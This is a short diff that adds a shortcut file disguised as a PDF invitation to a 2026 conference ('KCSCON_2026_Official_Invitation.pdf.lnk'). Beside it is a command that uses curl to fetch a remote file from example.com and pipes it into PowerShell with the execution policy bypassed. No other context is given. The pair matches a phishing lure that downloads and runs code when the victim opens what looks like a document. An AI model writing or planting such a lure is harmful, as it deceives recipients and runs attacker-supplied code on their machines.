@@ -1,0 +1,2 @@
+KCSCON_2026_Official_Invitation.pdf.lnk
+cmd.exe /c curl https://example.com/first.ini | powershell -ep bypass
